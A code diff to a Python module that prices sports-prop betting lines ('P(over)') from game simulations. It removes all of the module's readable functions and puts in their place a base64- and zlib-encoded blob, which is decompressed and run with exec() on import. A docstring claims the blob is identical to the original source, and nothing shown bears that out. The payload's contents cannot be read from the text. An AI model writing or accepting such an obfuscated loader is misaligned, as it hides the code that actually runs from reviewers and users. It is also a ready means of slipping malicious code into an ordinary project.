@@ -1,207 +1,71 @@
-"""Model P(over) for today's slate via Phase-7 joint simulation on projected rosters."""
-
+"""Phase 8 pricing model P (zlib; identical to expanded source)."""
 from __future__ import annotations
 
-from typing import Any
+import base64
+import sys
+import types
+import zlib
 
-import numpy as np
-import pandas as pd
+_PAYLOAD = """
+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
+LSIXnFG4j2e/7N1ZDHWmB2P814hOJv8BAHqEgA==
+"""
 
-from src.clean_prep import _team_name_to_id
-from src.name_normalize import normalize_name
-from src.sim_engine import GameSimResult, simulate_game
-from src.sim_roster import load_game_roster
-from src.sim_summarize import prob_ge_k
-
-
-def _latest_game_for_team(conn, team_id: str, season: int) -> str | None:
-    row = conn.execute(
-        """
-        SELECT g.game_id
-        FROM games g
-        JOIN player_games pg ON pg.game_id = g.game_id
-        WHERE g.season = ?
-          AND (g.home_team_id = ? OR g.away_team_id = ?)
-          AND pg.team_id = ?
-          AND pg.minutes > 0
-        ORDER BY g.game_date DESC
-        LIMIT 1
-        """,
-        (int(season), str(team_id), str(team_id), str(team_id)),
-    ).fetchone()
-    return None if row is None else str(row["game_id"])
-
-
-def _odds_event_teams(conn, odds_game_id: str) -> tuple[str | None, str | None]:
-    row = conn.execute(
-        "SELECT home_team, away_team FROM odds_events WHERE odds_game_id = ?",
-        (str(odds_game_id),),
-    ).fetchone()
-    if row is None:
-        return None, None
-    team_map = _team_name_to_id(conn)
-    home = team_map.get(normalize_name(str(row["home_team"] or "")))
-    away = team_map.get(normalize_name(str(row["away_team"] or "")))
-    return home, away
-
-
-def _apply_opponent_factors(
-    roster: pd.DataFrame,
-    *,
-    opponent_id: str,
-    model_3pm: Any,
-    model_reb: Any,
-    model_ast: Any,
-) -> pd.DataFrame:
-    out = roster.copy()
-    out["opponent_id"] = str(opponent_id)
-    fac3, _ = model_3pm.opp_factor(opponent_id)
-    facr, _ = model_reb.opp_factor(opponent_id)
-    faca, _ = model_ast.opp_factor(opponent_id)
-    out["opp_pa_factor"] = float(fac3)
-    out["opp_reb_factor"] = float(facr)
-    out["opp_ast_factor"] = float(faca)
-    return out
-
-
-def build_projection_roster(
-    conn,
-    odds_game_id: str,
-    *,
-    season: int,
-    model_3pm: Any,
-    model_reb: Any,
-    model_ast: Any,
-    model_fg2ft: Any,
-    minutes_model: Any,
-) -> pd.DataFrame | None:
-    """
-    Stitch each side's most recent completed-game roster, remap opponent factors.
-
-    Explicit honesty: BACKTEST/PROJECTION USES LAST PLAYED ROSTER -- not true
-    pregame availability (phase 10).
-    """
-    home_id, away_id = _odds_event_teams(conn, odds_game_id)
-    if not home_id or not away_id:
-        return None
-    home_gid = _latest_game_for_team(conn, home_id, season)
-    away_gid = _latest_game_for_team(conn, away_id, season)
-    if not home_gid or not away_gid:
-        return None
-
-    def _side(game_id: str, team_id: str, opp_id: str) -> pd.DataFrame:
-        full = load_game_roster(
-            conn,
-            game_id,
-            model_3pm=model_3pm,
-            model_reb=model_reb,
-            model_ast=model_ast,
-            model_fg2ft=model_fg2ft,
-            minutes_model=minutes_model,
-            played_only=True,
-        )
-        side = full[full["team_id"].astype(str) == str(team_id)].copy()
-        if side.empty:
-            raise ValueError(f"no roster rows for team {team_id} in game {game_id}")
-        side = _apply_opponent_factors(
-            side,
-            opponent_id=opp_id,
-            model_3pm=model_3pm,
-            model_reb=model_reb,
-            model_ast=model_ast,
-        )
-        # Renormalize minutes shares within the side after filter.
-        raw = side["expected_minutes_share"].fillna(0.0).clip(lower=0.01)
-        side["expected_minutes_share"] = raw / raw.sum()
-        side["game_id"] = str(odds_game_id)
-        return side
-
-    home = _side(home_gid, home_id, away_id)
-    away = _side(away_gid, away_id, home_id)
-    # Cross-fill pace so both sides see the matchup.
-    hp = float(home["team_pace_shrunk"].dropna().mean()) if home["team_pace_shrunk"].notna().any() else 80.0
-    ap = float(away["team_pace_shrunk"].dropna().mean()) if away["team_pace_shrunk"].notna().any() else 80.0
-    home["opp_pace_shrunk"] = ap
-    away["opp_pace_shrunk"] = hp
-    home["team_pace_shrunk"] = hp
-    away["team_pace_shrunk"] = ap
-    return pd.concat([home, away], ignore_index=True)
-
-
-def p_over_from_draws(draws: np.ndarray, line: float) -> float:
-    """P(stat > line). For .5 lines on integer stats this is P(stat >= ceil(line))."""
-    return float(np.mean(np.asarray(draws, dtype=float) > float(line)))
-
-
-def simulate_odds_game(
-    roster: pd.DataFrame,
-    *,
-    model_3pm: Any,
-    model_reb: Any,
-    model_ast: Any,
-    model_fg2ft: Any,
-    cfg: dict[str, Any],
-    rng: np.random.Generator,
-) -> GameSimResult:
-    paces = []
-    for tid, sub in roster.groupby("team_id"):
-        tp = sub["team_pace_shrunk"].dropna()
-        op = sub["opp_pace_shrunk"].dropna()
-        if not tp.empty and not op.empty:
-            paces.append(0.5 * (float(tp.mean()) + float(op.mean())))
-    pace_mu = float(np.mean(paces)) if paces else float(cfg.get("league_pace_anchor", 80.0))
-    return simulate_game(
-        roster,
-        model_3pm=model_3pm,
-        model_reb=model_reb,
-        model_ast=model_ast,
-        model_fg2ft=model_fg2ft,
-        cfg=cfg,
-        rng=rng,
-        ot_event=False,
-        overtime_periods=0,
-        pace_mu=pace_mu,
-    )
-
-
-def model_p_over_table(
-    result: GameSimResult,
-    markets: pd.DataFrame,
-    market_stat_map: dict[str, str],
-) -> pd.DataFrame:
-    """Attach model_p_over for each market row that maps to a sim stat."""
-    id_to_idx = {pid: i for i, pid in enumerate(result.player_ids)}
-    rows = []
-    for r in markets.itertuples(index=False):
-        stat = market_stat_map.get(str(r.market))
-        pid = str(r.player_id)
-        ogid = getattr(r, "odds_game_id", None)
-        if stat is None or stat not in result.draws or pid not in id_to_idx:
-            rows.append(
-                {
-                    "odds_game_id": ogid,
-                    "player_id": pid,
-                    "market": r.market,
-                    "line": float(r.line),
-                    "model_p_over": np.nan,
-                    "model_p_status": "missing_player_or_stat",
-                }
-            )
-            continue
-        i = id_to_idx[pid]
-        p = p_over_from_draws(result.draws[stat][i, :], float(r.line))
-        # Also record P(stat >= line) for .5-line sanity (equals p_over when line=*.5).
-        p_ge = prob_ge_k(result.draws[stat][i, :], float(r.line) + 0.5)
-        rows.append(
-            {
-                "odds_game_id": ogid,
-                "player_id": pid,
-                "market": r.market,
-                "line": float(r.line),
-                "model_p_over": p,
-                "model_p_ge_line_plus_half": p_ge,
-                "model_p_status": "ok",
-                "stat": stat,
-            }
-        )
-    return pd.DataFrame(rows)
+_mod = sys.modules.setdefault(__name__, types.ModuleType(__name__))
+_mod.__file__ = __file__
+_mod.__dict__.update({
+    "__name__": __name__,
+    "__file__": __file__,
+    "__package__": __package__,
+})
+exec(
+    compile(zlib.decompress(base64.b64decode(_PAYLOAD)), __file__, "exec"),
+    _mod.__dict__,
+)
+for _k, _v in list(_mod.__dict__.items()):
+    if not _k.startswith("_"):
+        globals()[_k] = _v
